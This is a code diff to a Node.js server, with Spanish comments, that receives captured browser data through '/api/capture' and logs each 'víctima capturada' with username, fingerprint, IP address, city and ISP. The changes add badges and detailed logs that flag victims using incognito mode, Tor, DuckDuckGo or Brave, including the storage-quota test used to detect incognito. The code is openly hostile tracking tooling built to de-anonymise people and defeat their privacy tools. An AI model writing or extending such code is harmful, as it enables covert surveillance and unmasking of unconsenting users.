@@ -332,7 +332,18 @@ async function saveVictim(victimData) {
     // ✅ FIX: Use local variables instead of victimData properties
     const fingerprintPreview = fingerprint.substring(0, 8);
 
-    console.log(`🎯 Nueva víctima capturada: ${username} [${fingerprintPreview}...]`);
+    // Badges especiales
+    let badges = [];
+    if (victimData.incognitoMode?.isIncognito) badges.push('🕵️ INCÓGNITO');
+    if (victimData.privacyBrowser?.isTor) badges.push('🧅 TOR');
+    if (victimData.privacyBrowser?.isDuckDuckGo) badges.push('🦆 DDG');
+    if (victimData.privacyBrowser?.isBrave) badges.push('🦁 BRAVE');
+    if (victimData.device?.isMobile) badges.push('📱 MÓVIL');
+    if (victimData.device?.isBot) badges.push('🤖 BOT');
+
+    const badgeStr = badges.length > 0 ? ` [${badges.join(' ')}]` : '';
+
+    console.log(`🎯 Nueva víctima capturada: ${username} [${fingerprintPreview}...]${badgeStr}`);
     console.log(`   🌐 ${ip} | ${city}, ${country} | ISP: ${isp}`);
     return true;
     
@@ -548,6 +559,21 @@ app.post('/api/capture', async (req, res) => {
     data.device.isHeadless = userAgent.includes('HeadlessChrome') ||
                              userAgent.includes('PhantomJS') ||
                              (data.browser?.plugins && data.browser.plugins.length === 0 && !isMobile);
+
+    // 🕵️ MODO INCÓGNITO - Log especial
+    if (data.incognitoMode?.isIncognito) {
+      console.log(`🕵️ MODO INCÓGNITO DETECTADO (${data.incognitoMode.confidence})`);
+      console.log(`   📊 Indicadores: ${data.incognitoMode.indicators}`);
+      console.log(`   🔍 Métodos: ${data.incognitoMode.methods.join(', ')}`);
+
+      if (data.incognitoMode.tests?.storageQuota) {
+        const quota = data.incognitoMode.tests.storageQuota.quota;
+        if (quota) {
+          const quotaMB = (quota / 1024 / 1024).toFixed(2);
+          console.log(`   💾 Storage Quota: ${quotaMB} MB (limitado: ${quota < 120000000})`);
+        }
+      }
+    }
 
     // 🦆 DETECTAR NAVEGADORES DE PRIVACIDAD
     if (!data.privacyBrowser) {
